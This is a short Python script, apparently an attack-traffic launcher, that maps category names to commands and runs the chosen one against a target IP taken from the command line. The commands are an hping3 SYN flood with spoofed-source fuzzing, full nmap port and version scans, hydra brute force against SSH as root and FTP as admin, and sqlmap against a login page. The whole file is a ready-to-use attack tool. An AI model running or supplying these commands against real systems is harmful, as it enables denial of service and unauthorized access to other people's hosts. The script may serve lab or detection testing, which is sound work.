import subprocess
import sys

ATTACK_REGISTRY = {
    'dos_hping':      lambda target: ['hping3', '-S', '--flood', '-p', '80', target],
    'portscan':       lambda target: ['nmap', '-sS', '-T4', '-p', '1-65535', target],
    'recon':          lambda target: ['nmap', '-sV', '-O', target],
    'bruteforce_ssh': lambda target: ['hydra', '-l', 'root', '-P', 'wordlist.txt', f'ssh://{target}'],
    'bruteforce_ftp': lambda target: ['hydra', '-l', 'admin', '-P', 'wordlist.txt', f'ftp://{target}'],
    'web_sqli':       lambda target: ['sqlmap', '-u', f'http://{target}/login', '--batch'],
    'fuzzing':        lambda target: ['hping3', '--rand-source', '-p', '++1', target],
}

def run_attack(category, target_ip):
    if category not in ATTACK_REGISTRY:
        print(f'Unknown category: {category}')
        sys.exit(1)

    cmd = ATTACK_REGISTRY[category](target_ip)
    print(f'[attacker] Starting {category} against {target_ip}')
    proc = subprocess.Popen(cmd)
    input('Press Enter to stop attack...')
    proc.terminate()
    proc.wait()
    print(f'[attacker] {category} complete')

if __name__ == '__main__':
    category = sys.argv[1]
    target_ip = sys.argv[2]
    run_attack(category, target_ip)